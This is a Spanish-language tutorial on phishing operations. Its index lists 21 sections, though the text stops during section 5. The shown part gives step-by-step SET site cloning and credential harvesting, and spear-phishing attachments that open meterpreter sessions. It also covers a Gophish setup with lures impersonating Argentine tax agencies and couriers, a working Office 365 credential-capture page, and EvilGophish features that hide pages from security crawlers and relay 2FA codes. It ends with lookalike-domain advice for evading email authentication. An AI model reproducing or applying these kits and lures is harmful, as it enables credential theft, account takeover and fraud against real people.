## Indice

> ⏱️ **Tiempo estimado:** 20 horas (~4 sesiones) (4186 lineas)


1. [¿Qué es Phishing?](#1-que-es-phishing)
2. [SET (Social Engineering Toolkit)](#2-set-social-engineering-toolkit)
   - [2.1 Instalación y primer inicio](#21-instalacion-y-primer-inicio)
   - [2.2 Menú principal explicado](#22-menu-principal-explicado)
   - [2.3 Website Attack Vectors — Clonación de sitios paso a paso](#23-website-attack-vectors--clonacion-de-sitios-paso-a-paso)
   - [2.4 SET Spear Phishing con payload](#24-set-spear-phishing-con-payload)
   - [2.5 SET Mass Mailer](#25-set-mass-mailer)
   - [2.6 SET QR Code Generator](#26-set-qr-code-generator)
   - [2.7 SET Troubleshooting común](#27-set-troubleshooting-comun)
3. [Gophish — Framework Profesional](#3-gophish--framework-profesional)
   - [3.1 Instalación](#31-instalacion)
   - [3.2 Arquitectura de Gophish](#32-arquitectura-de-gophish)
   - [3.3 Sending Profile — Configuración SMTP](#33-sending-profile--configuracion-smtp)
   - [3.4 Email Templates — Diseño de Plantillas](#34-email-templates--diseno-de-plantillas)
   - [3.5 Landing Pages — Páginas de Captura](#35-landing-pages--paginas-de-captura)
   - [3.6 Users & Groups — Targets](#36-users--groups--targets)
   - [3.7 Campaigns — Lanzamiento](#37-campaigns--lanzamiento)
   - [3.8 Resultados y Reportes](#38-resultados-y-reportes)
   - [3.9 API REST de Gophish](#39-api-rest-de-gophish)
   - [3.10 Gophish Troubleshooting](#310-gophish-troubleshooting)
4. [EvilGophish — Gophish Mejorado](#4-evilgophish--gophish-mejorado)
   - [4.1 Características principales](#41-caracteristicas-principales)
   - [4.2 Instalación de EvilGophish](#42-instalacion-de-evilgophish)
   - [4.3 Telegram Bot Integration](#43-telegram-bot-integration)
5. [DKIM / SPF / DMARC — Bypass y Configuración](#5-dkim--spf--dmarc--bypass-y-configuracion)
   - [5.1 ¿Cómo funcionan?](#51-como-funcionan)
   - [5.2 SPF (Sender Policy Framework)](#52-spf-sender-policy-framework)
   - [5.3 DKIM (DomainKeys Identified Mail)](#53-dkim-domainkeys-identified-mail)
   - [5.4 DMARC (Domain-based Message Authentication, Reporting & Conformance)](#54-dmarc-domain-based-message-authentication-reporting--conformance)
   - [5.5 Técnicas de bypass](#55-tecnicas-de-bypass)
   - [5.6 Chequeo de entregabilidad](#56-chequeo-de-entregabilidad)
6. [Email Warm-up y Reputación de Dominio](#6-email-warm-up-y-reputacion-de-dominio)
   - [6.1 Estrategia de warm-up](#61-estrategia-de-warm-up)
   - [6.2 Reputación de dominio](#62-reputacion-de-dominio)
7. [URL Obfuscation — Cómo esconder la URL real](#7-url-obfuscation--como-esconder-la-url-real)
   - [7.1 Redirectors](#71-redirectors)
   - [7.2 URL encoding y ofuscación](#72-url-encoding-y-ofuscacion)
   - [7.3 QR Code Phishing (Quishing)](#73-qr-code-phishing-quishing)
8. [Smishing (SMS Phishing)](#8-smishing-sms-phishing)
   - [8.1 Plataformas de envío masivo](#81-plataformas-de-envio-masivo)
   - [8.2 Twilio smishing setup](#82-twilio-smishing-setup)
   - [8.3 Templates de smishing efectivos](#83-templates-de-smishing-efectivos)
9. [Vishing (Voice Phishing)](#9-vishing-voice-phishing)
   - [9.1 Asterisk — Central telefónica VoIP](#91-asterisk--central-telefonica-voip)
   - [9.2 Twilio para vishing](#92-twilio-para-vishing)
   - [9.3 Deepfake voice para vishing](#93-deepfake-voice-para-vishing)
10. [Spear Phishing Avanzado (Dirigido)](#10-spear-phishing-avanzado-dirigido)
    - [10.1 OSINT previo — Investigación del target](#101-osint-previo--investigacion-del-target)
    - [10.2 Construcción del spear phish](#102-construccion-del-spear-phish)
    - [10.3 Payloads para spear phishing](#103-payloads-para-spear-phishing)
11. [Phishing Frameworks Comparación](#11-phishing-frameworks-comparacion)
12. [Reverse Proxy Phishing — Bypass de 2FA](#12-reverse-proxy-phishing--bypass-de-2fa)
    - [12.1 Cómo funciona](#121-como-funciona)
    - [12.2 Evilginx2](#122-evilginx2)
    - [12.3 Modlishka](#123-modlishka)
    - [12.4 Muraena + Necrobrowser (BITM)](#124-muraena--necrobrowser-bitm)
13. [Landing Page Cloaking — Evasión de Bots](#13-landing-page-cloaking--evasion-de-bots)
    - [13.1 Cloaking por IP](#131-cloaking-por-ip)
    - [13.2 Cloaking por User-Agent](#132-cloaking-por-user-agent)
    - [13.3 Cloaking por comportamiento](#133-cloaking-por-comportamiento)
    - [13.4 Cloaking con Cloudflare Workers](#134-cloaking-con-cloudflare-workers)
14. [Post-Phishing: Validación de Credenciales y Automatización](#14-post-phishing-validacion-de-credenciales-y-automatizacion)
    - [14.1 Validación automática de credenciales](#141-validacion-automatica-de-credenciales)
    - [14.2 Telegram Bot para alerts en tiempo real](#142-telegram-bot-para-alerts-en-tiempo-real)
15. [Detección de Phishing — Cómo evadir](#15-deteccion-de-phishing--como-evadir)
    - [15.1 Checklist de lo que los filtros revisan](#151-checklist-de-lo-que-los-filtros-revisan)
    - [15.2 Simulación de conversación](#152-simulacion-de-conversacion)
    - [15.3 Evasión de sandboxes](#153-evasion-de-sandboxes)
16. [Recursos y Referencias](#16-recursos-y-referencias)
17. [Setup Completo de Operación de Phishing](#17-setup-completo-de-operacion-de-phishing)
    - [17.1 Obtención de VPS (Servidor Dedicado)](#171-obtencion-de-vps-servidor-dedicado)
    - [17.2 Registro de Dominio (OPSEC)](#172-registro-de-dominio-opsec)
    - [17.3 Infraestructura de Email (Postfix + Dovecot + OpenDKIM + OpenDMARC)](#173-infraestructura-de-email-postfix--dovecot--opendkim--opendmarc)
    - [17.4 IP Warm-Up Schedule (30 Días)](#174-ip-warm-up-schedule-30-dias)
    - [17.5 Reputación de IP y Monitoreo](#175-reputacion-de-ip-y-monitoreo)
18. [Landing Page Quality — Réplica Perfecta](#18-landing-page-quality--replica-perfecta)
    - [18.1 HTML/CSS Perfect Replication](#181-htmlcss-perfect-replication)
    - [18.2 Responsive Clone con Frameworks Modernos](#182-responsive-clone-con-frameworks-modernos)
    - [18.3 Bot Cloaking con IP Quality Scoring](#183-bot-cloaking-con-ip-quality-scoring)
    - [18.4 SSL Certificate Validation (Candado Verde)](#184-ssl-certificate-validation-candado-verde)
19. [Phishing Kit Development (PHP, Node.js, Python, Serverless)](#19-phishing-kit-development-php-nodejs-python-serverless)
    - [19.1 PHP Phishing Kit](#191-php-phishing-kit)
    - [19.2 Node.js/Express Phishing Kit](#192-nodejsexpress-phishing-kit)
    - [19.3 Python Flask Phishing Kit](#193-python-flask-phishing-kit)
    - [19.4 Serverless Phishing (AWS Lambda + API Gateway)](#194-serverless-phishing-aws-lambda--api-gateway)
    - [19.5 Cloudflare Workers Phishing Kit](#195-cloudflare-workers-phishing-kit)
20. [Telegram/Discord/Slack Integration para Realtime Alerts](#20-telegramdiscordslack-integration-para-realtime-alerts)
    - [20.1 Telegram Bot Setup Completo](#201-telegram-bot-setup-completo)
    - [20.2 Discord Webhook Integration](#202-discord-webhook-integration)
    - [20.3 Slack Integration](#203-slack-integration)
    - [20.4 Credential Parsing y Validation Automática](#204-credential-parsing-y-validation-automatica)
    - [20.5 2FA Token Capture en Tiempo Real](#205-2fa-token-capture-en-tiempo-real)
21. [Phishing Analysis y Metrics](#21-phishing-analysis-y-metrics)
    - [21.1 Click-Through Rate Optimization](#211-click-through-rate-optimization)
    - [21.2 A/B Testing de Plantillas](#212-ab-testing-de-plantillas)

---
# Phishing — Frameworks, Técnicas y Operaciones Complejas

## 1. ¿Qué es [phishing](../raw/ph1sh1ng.md)?

Phishing es una técnica de ingeniería social que consiste en suplantar la identidad de una entidad legítima para robar credenciales, información sensible o distribuir malware. No es solo mandar un mail: hoy incluye SMS ([smishing](../raw/ph1sh1ng.md#smishing)), llamadas ([vishing](../raw/ph1sh1ng.md#vishing)), QR codes (quishing), deepfakes de voz, y ataques multiplataforma.

El éxito del phishing no depende de la tecnología, sino de la **psicología humana**. Toda campaña de phishing efectiva explota principios básicos:
- **Autoridad**: "Soy de TI, necesito tu contraseña urgente"
- **Urgencia**: "Tu cuenta será desactivada en 24 horas"
- **Escasez**: "Solo 3 lugares disponibles para la actualización"
- **Familiaridad**: "Hola {nombre}, vi tu perfil en LinkedIn"
- **Reciprocidad**: "Completá esta encuesta y ganá una gift card"

Este tutorial cubre desde herramientas automatizadas hasta técnicas avanzadas de evasión, post-explotación y bypass de 2FA.

---

## 2. [set](../raw/ph1sh1ng.md#social-engineering-toolkit) ([social engineering toolkit](../raw/ph1sh1ng.md#social-engineering-toolkit))

SET es el framework de [phishing](../raw/ph1sh1ng.md) más conocido de Kali Linux. Desarrollado por TrustedSec, está pensado para pruebas de penetración rápidas con un workflow guiado.

### 2.1 Instalación y primer inicio

```bash
# Kali ya lo trae preinstalado, pero si no:
sudo apt update && sudo apt install -y set

# Iniciar el toolkit
sudo setoolkit

# SET se maneja con menús numerados.
# En la pantalla de bienvenida, aceptás el EULA (ponés "y")
# Vas a ver el menú principal con 9 opciones numeradas
```

### 2.2 Menú principal explicado

```
[--- Main Menu ---]
1) Social-Engineering Attacks     → Ataques de ingeniería social
2) Penetration Testing (Fast-Track) → Test rápidos de penetración
3) Third Party Modules            → Módulos externos (Java, PowerShell)
4) Update the Metasploit Framework→ Actualizar MSF
5) Update the Social Engineering Toolkit
6) Help/CREDITS
7) Exit
```

Elegimos **1) Social-Engineering Attacks** y vemos:

```
1) Spear-Phishing Attack Vectors    → Phishing dirigido con payload
2) Website Attack Vectors           → Clonar sitios web con harvesters
3) Infectious Media Generator       → USB/CD infectados con autorun
4) Create a Payload and Listener    → Generar payload + handler
5) Mass Mailer Attack               → Envío masivo de emails
6) Arduino-Based Attack Vector      → Teensy/Arduino como HID
7) Wireless Access Point Attack Vector → Evil Twin
8) QRCode Generator Attack Vector   → QR maliciosos
9) Powershell Attack Vectors        → PowerShell one-liners
10) Third Party Modules             → Módulos comunitarios (Java Applet, etc)
```

### 2.3 Website Attack Vectors — Clonación de sitios paso a paso

```bash
# SET → 1) Social-Engineering Attacks → 2) Website Attack Vectors

# Submenú:
1) Java Applet Attack Method
2) Metasploit Browser Exploit Method
3) Credential Harvester Attack Method  ← ESTE es el que usamos
4) Tabnabbing Attack Method
5) Web Jacking Attack Method
6) Multi-Attack Web Method
7) HTA Attack Method
8) Import Sites

# Elegimos 3) Credential Harvester Attack Method
# Luego:
1) Web Template    → Usar plantilla predefinida
2) Site Cloner     → Clonar URL existente  ← ESTE
3) Custom Import   → Importar página custom

# Elegimos 2) Site Cloner

# SET pregunta: "IP address for the POST back in Harvester"
# Ponemos la IP de nuestra máquina atacante (la que la víctima va a acceder)
# Ej: 192.168.1.100

# SET pregunta: "Enter the url to clone"
# Ponemos la URL que queremos clonar
# Ej: http://facebook.com/login.php
#   o http://www.google.com
#   o http://office.com (casilla de login de Office 365)

# SET descarga la página, la sirve en un servidor web y captura:
# - Username/Password
# - POST data completa
# - Se guarda en /root/.set/logs/
```

### 2.4 SET [spear phishing](../raw/ph1sh1ng.md#spear-phishing) con [payload](../raw/m3t4spl01t.md#payloads)

```bash
# SET → 1) Social-Engineering Attacks → 1) Spear-Phishing Attack Vectors

# Elegimos payload:
1) Use a Pre-Defined Template       → Plantillas existentes
2) Create a FileFormat Payload      → PDF/DOC/XLS malicioso
3) Create a Social-Engineering Template → Plantilla custom

# Elegimos 1) Use a Pre-Defined Template
# SET lista plantillas disponibles:
# - Computer Update (status update de Windows)
# - Domain Confirmation (confirmación de Outlook Web Access)
# - IRS Complaint (aviso de impuestos)
# - Password Expired (contraseña expirada)
# - etc

# Elegimos la que queremos modificar
# SET pregunta: "Do you want to send this email to a single email address or group? (1 or 2)"
# 1 → spear phish individual
# 2 → mass email a lista

# SET pregunta: email payload type:
# 1) Microsoft Office payload (.doc macro)
# 2) PDF embedded payload
# 3) HTML Application (.hta)

# SET configura Metasploit listener automáticamente

# Resultado: la víctima recibe el mail con el adjunto, lo abre,
# y recibís una session meterpreter.
```

### 2.5 SET Mass Mailer

```bash
# SET → 1) Social-Engineering Attacks → 5) Mass Mailer Attack

# 1) Email Attack with SendEmail (opción 1)
# 2) Email Attack with massmailer (opción 2) → permite SMTP con auth

# Pide: servidor SMTP, puerto, usuario, password
# Pide: destinatarios (archivo de texto, uno por línea)
# Pide: asunto, cuerpo del email

# Ejemplo con Gmail SMTP:
# servidor: smtp.gmail.com:587
# usuario: tu_cuenta@gmail.com
# password: app password (no tu password real, generá uno en Google Config > App passwords)

# Si no tenés SMTP, podés usar sendmail local:
sudo apt install sendmail
sendmail -t < email.txt
```

### 2.6 SET QR Code Generator

```bash
# SET → 1) Social-Engineering Attacks → 8) QRCode Generator Attack Vector

# SET genera un QR code que apunta a una URL maliciosa
# El QR se guarda como PNG
# Podés ponerlo en un cartel, email, sticker en la calle, etc.

# SET pregunta: URL maliciosa
# Ej: http://192.168.1.100:8080/fake-login
# SET genera el QR y lo sirve
```

### 2.7 SET Troubleshooting común

| Problema | Solución |
|----------|----------|
| "Port 80 already in use" | `sudo fuser -k 80/tcp` o cambiar [puerto](../raw/r3d3s-f0nd4m3nt0s.md#puertos) |
| Site Cloner no descarga bien | Usar `Custom Import` con la página guardada localmente |
| La página clonada se ve mal | Falta CSS/JS embebido, usar `wget -r -l 1 --convert-links` primero |
| [metasploit](../raw/m3t4spl01t.md) handler no arranca | Iniciar manual: `msfconsole -r /root/.set/meta_config` |
| No llegan los emails | SPF/DKIM/DMARC bloqueando, ver sección 5 |

---

## 3. [gophish](../raw/ph1sh1ng.md#gophish) — Framework Profesional

Gophish es el estándar de facto para campañas de [phishing](../raw/ph1sh1ng.md) en pruebas de penetración. Tiene interfaz web, API REST, y gestión completa de campañas.

### 3.1 Instalación

```bash
# Descargar la última release
cd /opt
wget https://github.com/gophish/gophish/releases/latest/download/gophish-v0.12.1-linux-64bit.zip

# También podés usar curl:
curl -L -o gophish.zip https://github.com/gophish/gophish/releases/latest/download/gophish-v0.12.1-linux-64bit.zip

# Descomprimir
unzip gophish-*.zip
mv gophish-v0.12.1-linux-64bit gophish
cd gophish

# Dar permisos
chmod +x gophish

# Configurar (opcional)
# Editar config.json si querés cambiar puertos o IP
cat config.json
{
    "admin_server": {
        "listen_url": "0.0.0.0:3333",
        "use_tls": true
    },
    "phish_server": {
        "listen_url": "0.0.0.0:80",
        "use_tls": false
    },
    "db_name": "sqlite3",
    "db_path": "gophish.db",
    "migrations_prefix": "db/db_"
}

# Iniciar
./gophish
# Buscá en el output la línea:
# "Please login with the username admin and the password XXXX"
# Ese password es auto-generado y aparece UNA SOLA vez en el log

# Acceder:
# https://IP_DEL_SERVIDOR:3333
# Usuario: admin
# Password: el que apareció en el log
```

### 3.2 Arquitectura de Gophish

Gophish tiene 4 componentes principales que interactúan:

```
┌─────────────────────────────────────────────┐
│                  Gophish                     │
│  ┌─────────────┐  ┌──────────────────────┐  │
│  │ Admin UI    │  │  Phishing Server     │  │
│  │ :3333 HTTPS │  │  :80/:443 HTTP/HTTPS │  │
│  │             │  │                      │  │
│  │ Dashboard   │  │  Landing Pages       │  │
│  │ Campaigns   │  │  Email Tracking      │  │
│  │ Templates   │  │  Image Tracking      │  │
│  │ Groups      │  │  Redirects           │  │
│  │ Profiles    │  │                      │  │
│  └─────────────┘  └──────────────────────┘  │
│  ┌──────────────────────────────────────┐   │
│  │  SQLite/MySQL Database              │   │
│  │  Events, Results, Users, Templates  │   │
│  └──────────────────────────────────────┘   │
└─────────────────────────────────────────────┘
```

### 3.3 Sending Profile — Configuración SMTP

El Sending Profile es la configuración del servidor de correo saliente.

```bash
# En la UI Admin:
# → Sending Profiles → New Profile

# Campos:
# * Name: "Mailgun Corporate" (nombre descriptivo)
# * Interface Type: SMTP
# * SMTP Host: smtp.mailgun.org:587 (o el que uses)
# * From Address: "soporte@tuempresa.com"
# * From Name: "Soporte Técnico"
# * Username: postmaster@tu-dominio.com
# * Password: ********
# * Headers: (opcional, podés agregar Reply-To, etc)
#   Reply-To: no-reply@tuempresa.com
# * Send Test Email: SIEMPRE probar antes

# === Proveedores SMTP recomendados ===

# 1. SendGrid (recomendado para phishing)
# Host: smtp.sendgrid.net:587
# User: apikey
# Pass: SG.XXXXXXXXXXXXXXXXXXXX

# 2. Mailgun
# Host: smtp.mailgun.org:587
# User: postmaster@tu-dominio.com
# Pass: key-XXXXXXXXX

# 3. Amazon SES
# Host: email-smtp.us-east-1.amazonaws.com:587
# User: AKIAXXXXXXXXXXX
# Pass: BK+XXXXXXXXXXX

# 4. Tu propio servidor SMTP
# Host: mail.tudominio.com:25 (o 587)
# User: admin@tudominio.com
# Pass: ********

# 5. Brevo (antes SendinBlue)
# Host: smtp-relay.brevo.com:587
# User: tu-email
# Pass: xxxxx

# === Verificar entrega ===
# Siempre enviate un test a vos mismo antes de la campaña real
# Revisá:
# - ¿Llegó a Inbox o Spam?
# - ¿Las cabeceras SPF/DKIM/DMARC están OK?
# - ¿Los links tracking funcionan?
```

### 3.4 Email Templates — Diseño de Plantillas

Las plantillas de Gophish usan **Go templates** con variables especiales.

```html
<!-- Template básico con todas las variables disponibles -->
<html>
<head>
    <meta charset="UTF-8">
    <style>
        body { font-family: Arial, sans-serif; }
        .header { background: #0078d4; color: white; padding: 20px; }
        .content { padding: 20px; }
        .button { 
            background: #0078d4; color: white; padding: 12px 24px; 
            text-decoration: none; border-radius: 4px; 
        }
        .footer { color: #888; font-size: 12px; margin-top: 30px; }
    </style>
</head>
<body>
    <div class="header">
        <h2>Actualización de Seguridad</h2>
    </div>
    <div class="content">
        <p>Estimado {{.FirstName}},</p>
        <p>Hemos detectado actividad inusual en tu cuenta corporativa.</p>
        <p>Por favor verificá tus credenciales haciendo clic en el siguiente enlace:</p>
        <p><a href="{{.URL}}" class="button">Verificar Cuenta</a></p>
        <p>Si no realizaste esta solicitud, ignorá este mensaje.</p>
        <p>Saludos,<br>Departamento de Seguridad Informática</p>
    </div>
    <div class="footer">
        <p>{{.From}}</p>
        <p><img src="{{.Tracker}}"/></p>
    </div>
</body>
</html>

<!-- Variables disponibles:
{{.FirstName}}     → Primer nombre del target
{{.LastName}}      → Apellido
{{.Email}}         → Email del target
{{.Position}}      → Cargo
{{.URL}}           → URL de la landing page (única por target)
{{.Tracker}}       → Tracking pixel (único por target)
{{.From}}          → Remitente configurado
{{.RID}}           → ID único del recipient
-->
```

**Técnicas para aumentar la tasa de clics:**

```html
<!-- 1. Email con adjunto HTML malicioso -->
<p>Adjunto encontrará el documento con la información solicitada.</p>

<!-- 2. Falso error de autenticación -->
<p>Su sesión de Office 365 expiró. <a href="{{.URL}}">Haga clic aquí</a> para renovarla.</p>

<!-- 3. Falso documento compartido (Google Drive spoof) -->
<p>{{.FirstName}} ha compartido un documento contigo en Google Docs</p>

<!-- 4. Falso aviso de HR/Recursos Humanos -->
<p>Actualización de tus datos personales para el recibo de sueldo</p>

<!-- 5. Falso aviso de DHL/Correo Argentino/Andreani -->
<p>Tu paquete está retenido en aduana. Regularizá el pago aquí:</p>

<!-- 6. Falso aviso de AFIP/ARCA/ANSES -->
<p>Devolución de Ganancias 2024 — Completá el formulario para recibir tu reintegro</p>
```

### 3.5 Landing Pages — Páginas de Captura

```html
<!-- Landing page que captura credenciales de Office 365 -->
<html>
<head>
    <title>Iniciar Sesión - Microsoft Office 365</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #f0f0f0; }
        .login-box { 
            width: 360px; margin: 100px auto; background: white;
            padding: 30px; box-shadow: 0 2px 6px rgba(0,0,0,0.2);
        }
        input { width: 100%; padding: 10px; margin: 8px 0; }
        button { 
            width: 100%; padding: 10px; background: #0078d4; color: white;
            border: none; cursor: pointer; 
        }
        .error { color: red; font-size: 14px; }
        .logo { text-align: center; margin-bottom: 20px; }
    </style>
</head>
<body>
    <div class="login-box">
        <div class="logo">
            <img src="https://logo.clearbit.com/office.com" height="50"/>
        </div>
        <h3>Iniciar sesión en Office 365</h3>
        <form method="post" action="{{.URL}}">
            <input type="email" name="username" placeholder="Correo electrónico" required>
            <input type="password" name="password" placeholder="Contraseña" required>
            <button type="submit">Iniciar sesión</button>
        </form>
        <p class="error">Su sesión ha expirado. Ingrese sus credenciales nuevamente.</p>
    </div>
    <script>
        // Pasar query params de la URL original
        const params = new URLSearchParams(window.location.search);
        if (params.get('redirect_uri')) {
            document.querySelector('input[name="redirect"]').value = params.get('redirect_uri');
        }
    </script>
</body>
</html>
```

**Configurar Landing Page en Gophish:**

```bash
# En la UI Admin:
# → Landing Pages → New Page

# Name: "O365 Login Clone"
# HTML: pegar el HTML de arriba
# Capture Submitted Data: CHECK (captura passwords)
# Capture Passwords: CHECK
# Redirect to: https://www.office.com (URL real después del POST)
#   → Así si la víctima pone credenciales, lo redirige al sitio real y no sospecha
```

### 3.6 Users & Groups — Targets

```bash
# Importar targets desde CSV
# Formato:
FirstName,LastName,Email,Position
Juan,Pérez,jperez@empresa.com,Analista
María,García,mgarcia@empresa.com,Gerente

# O manualmente:
# → Users & Groups → New Group
# Name: "Departamento IT"
# Targets: agregar uno por uno o importar CSV
```

### 3.7 Campaigns — Lanzamiento

```bash
# → Campaigns → New Campaign
# Name: "Campaña IT Noviembre 2024"
# Email Template: "Actualización Seguridad" (template creado antes)
# Landing Page: "O365 Login Clone"
# URL: https://phishing.tudominio.com (donde apunta tu servidor Gophish)
# Sending Profile: "Mailgun Corporate"
# Groups: "Departamento IT"
# Launch Date: programar o immediate

# Parámetros adicionales:
# * Launch Date: podés programar para día/hora específica
# * Send Results Email: recibir resumen por email
# * Analytics: tracking de aperturas, clics, credenciales

# Después de lanzar, la campaña muestra en tiempo real:
# - Total enviados / Entregados
# - Abiertos (Open Rate) → detecta cuando abren el email
# - Clicked (Click Rate) → hacen clic en el link
# - Data Submitted → pusieron credenciales
# - Email Reported → reportaron como phishing
```

### 3.8 Resultados y Reportes

```bash
# Dashboard muestra:
# ┌──────────────────┬────────┬────────┬────────┐
# │ Campaña          │ Env.   │ Abiertos│ Clics  │
# ├──────────────────┼────────┼────────┼────────┤
# │ IT Nov 2024      │ 50     │ 38     │ 22     │
# │ HR Dic 2024      │ 30     │ 25     │ 18     │
# └──────────────────┴────────┴────────┴────────┘

# Haciendo clic en una campaña, ves por target:
# - Email, Nombre, Estado
# - IP, User-Agent, Sistema Operativo, Navegador
# - Timestamps: cuándo abrió, cuándo hizo clic, cuándo puso credenciales
# - Credenciales capturadas

# Exportar resultados:
# → Results → Export CSV
# Incluye: timestamp, email, ip, user-agent, credenciales, etc.
```

### 3.9 API REST de Gophish

```bash
# Generar API Key en Settings → API Key

# Ejemplos con curl:
API_KEY="tu-api-key"
SERVER="https://gophish-server:3333"

# Listar campañas
curl -k -H "Authorization: $API_KEY" $SERVER/api/campaigns/ | jq .

# Crear grupo
curl -k -X POST -H "Authorization: $API_KEY" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "Test Group",
    "targets": [
      {"first_name": "Juan", "last_name": "Pérez", "email": "juan@test.com"}
    ]
  }' $SERVER/api/groups/

# Lanzar campaña
curl -k -X POST -H "Authorization: $API_KEY" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "API Campaign",
    "template": {"name": "Test Template"},
    "page": {"name": "Test Landing Page"},
    "url": "http://phishing.test.com",
    "smtp": {"name": "Test SMTP"},
    "groups": [{"name": "Test Group"}]
  }' $SERVER/api/campaigns/

# Obtener resultados
curl -k -H "Authorization: $API_KEY" $SERVER/api/results/?campaign_id=1 | jq .
```

### 3.10 Gophish Troubleshooting

| Problema | Causa | Solución |
|----------|-------|----------|
| Los emails no llegan | SPF/DKIM no configurados | Ver sección 5 |
| Landing page no carga | [puerto](../raw/r3d3s-f0nd4m3nt0s.md#puertos) 80/443 en uso | `netstat -tulpn \| grep 80` |
| Tracking no funciona | Imagen bloqueada | Clientes de correo bloquean imágenes por defecto |
| Certificado [ssl](../raw/r3d3s-f0nd4m3nt0s.md#ssl-tls)) inválido | No configuraste [tls](../raw/r3d3s-f0nd4m3nt0s.md#ssl-tls) | Usar Let's Encrypt o configurar en config.json |
| La base de datos se corrompe | SQLite con múltiples instancias | Solo correr un gophish a la vez |
| "URL already in use" | Otra campaña activa en misma URL | Usar URLs diferentes por campaña |

---

## 4. EvilGophish — [gophish](../raw/ph1sh1ng.md#gophish) Mejorado

[EvilGophish](https://github.com/fin3ss3g0d/evilgophish) es un fork de Gophish con funcionalidades avanzadas para evasión.

### 4.1 Características principales

```bash
# 1. Certificados SSL automáticos con Let's Encrypt
# EvilGophish obtiene certificados reales para tu dominio
# → El candado verde aparece en el navegador

# 2. Proxy inverso integrado
# Oculta la IP real del servidor Gophish
# Usa Cloudflare o nginx como reverse proxy

# 3. Detección de bots/crawlers
# Si Googlebot, Bingbot o servicios de seguridad escanean tu página,
# EvilGophish les sirve la página real (no la falsa)
# Así no te detectan los crawlers de seguridad

# 4. Captura de 2FA tokens (OTP)
# Si la víctima pone username+password+OTP, captura todo
# El OTP se reenvía en tiempo real al servidor real para mantener la sesión

# 5. Telegram bot para notificaciones en tiempo real
# Cada vez que alguien pone credenciales:
# → Te llega un mensaje de Telegram con user, pass, IP, timestamp
```

### 4.2 Instalación de EvilGophish

```bash
git clone https://github.com/fin3ss3g0d/evilgophish.git
cd evilgophish

# Configurar
cp config.py.example config.py

# Editar config.py:
# SUBDOMAIN = "login"
# DOMAIN = "tu-empresa.com"  # dominio que controlás
# ROOT_DOMAIN = "tu-empresa.com"
# NS1_DOMAIN = "ns1.tu-empresa.com"
# NS2_DOMAIN = "ns2.tu-empresa.com"
# USE_SSL = True
# TELEGRAM_BOT_TOKEN = "tu-token"
# TELEGRAM_CHAT_ID = "tu-chat-id"

# Instalar dependencias
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt

# Iniciar
python3 setup.py
# Esto configura el reverse proxy, los certificados, y arranca Gophish + EvilGophish
```

### 4.3 Telegram Bot Integration

```python
# config.py snippet para Telegram
TELEGRAM_BOT_TOKEN = "1234567890:ABCdefGHIjklmNOPqrstUVwxyz"
TELEGRAM_CHAT_ID = "-1001234567890"

# Cuando captura credenciales, el bot envía:
"""
🔴 NUEVAS CREDENCIALES CAPTURADAS
📧 Email: jperez@empresa.com
🔑 Password: Passw0rd2024!
🔐 OTP: 482193
🌐 IP: 190.210.30.50
🕐 Timestamp: 2024-11-15 14:32:21
📱 UA: Chrome/119 Windows 10
"""

# Crear tu propio bot en Telegram:
# 1) Buscá @BotFather en Telegram
# 2) Mandale /newbot
# 3) Te da el token
# 4) Creá un grupo, agregá tu bot
# 5) Mandale un mensaje al bot en el grupo
# 6) Visitá: https://api.telegram.org/bot<TU_TOKEN>/getUpdates
# 7) Buscá "chat": {"id": -1001234567890} — ese es tu CHAT_ID
```

---

## 5. DKIM / SPF / DMARC — Bypass y Configuración

Los mecanismos de autenticación de email (SPF, DKIM, DMARC) son el principal obstáculo para que un [phishing](../raw/ph1sh1ng.md) llegue a la bandeja de entrada.

### 5.1 ¿Cómo funcionan?

```
┌─────────┐     ┌──────────────┐     ┌─────────┐
│ Remitente│────▶│ Servidor SMTP │────▶│Destinat.│
└─────────┘     └──────────────┘     └─────────┘
                       │
                  ┌────▼────┐
                  │ DNS Check│
                  │ ┌──────┐ │
                  │ │SPF   │ │ → ¿El IP remitente está autorizado?
                  │ │DKIM  │ │ → ¿La firma criptográfica es válida?
                  │ │DMARC │ │ → ¿Qué hacer si SPF/DKIM fallan?
                  │ └──────┘ │
                  └─────────┘
```

### 5.2 SPF (Sender Policy Framework)

```bash
# SPF registra qué IPs pueden enviar emails para tu dominio
# Registro TXT en DNS:
# v=spf1 include:_spf.google.com ip4:192.168.1.0/24 ~all

# Reglas SPF comunes:
v=spf1 include:spf.mandrillapp.com ~all     # Mailchimp
v=spf1 include:spf.protection.outlook.com -all  # Office 365
v=spf1 include:_spf.google.com ~all         # Gmail/G Suite
v=spf1 mx a ip4:1.2.3.4 -all               # Custom

# Mecanismos:
# include: → delegar a otro SPF
# ip4: → IP o rango permitido
# ip6: → IPv6 permitido
# a → el registro A del dominio
# mx → los servidores MX del dominio
# all → todos (calificador)

# Calificadores:
# + → PASS (por defecto)
# ? → NEUTRAL (no dice nada)
# ~ → SOFTFAIL (probablemente falso, pero aceptar)
# - → FAIL (rechazar definitivamente)
```

### 5.3 DKIM (DomainKeys Identified Mail)

```bash
# DKIM agrega una firma criptográfica al header del email
# El servidor receptor verifica la firma consultando el DNS

# Generar par de keys DKIM:
openssl genrsa -out dkim_private.pem 2048
openssl rsa -in dkim_private.pem -pubout -out dkim_public.pem

# Agregar registro TXT en DNS:
# Nombre: default._domainkey.tudominio.com
# Valor: v=DKIM1; h=sha256; k=rsa; p=MIGfMA0GCSqGSIb4...

# Verificar DKIM:
# Usar: https://www.dmarcanalyzer.com/dkim-checker/
# O: dig default._domainkey.tudominio.com TXT

# Si usás SendGrid/Mailgun:
# Ellos te dan la key pública, solo tenés que agregarla al DNS
```

### 5.4 DMARC (Domain-based Message Authentication, Reporting & Conformance)

```bash
# DMARC le dice al receptor qué hacer si SPF y/o DKIM fallan
# Registro TXT en DNS:
_dmarc.tudominio.com → v=DMARC1; p=none; rua=mailto:dmarc@tudominio.com

# Políticas:
p=none       → No hacer nada (solo reportar)
p=quarantine → Marcar como spam
p=reject     → Rechazar el email (no llega)

# Tags:
# rua → reports agregados (XML)
# ruf → reports forenses (individuales)
# pct → percentage (100 = aplicar a todos)
# sp → política para subdominios
# adkim → strict/relaxed alineación DKIM
# aspf → strict/relaxed alineación SPF
```

### 5.5 Técnicas de bypass

```bash
# 1. Registrar dominios similares (lookalike, typosquatting)
# En lugar de "empresa.com", usá:
#   - ernpresa.com (error común de tipeo)
#   - empresa-seguridad.com (agregar palabra)
#   - empresa-verify.com (variante)
#   - empressa.com (letra extra)
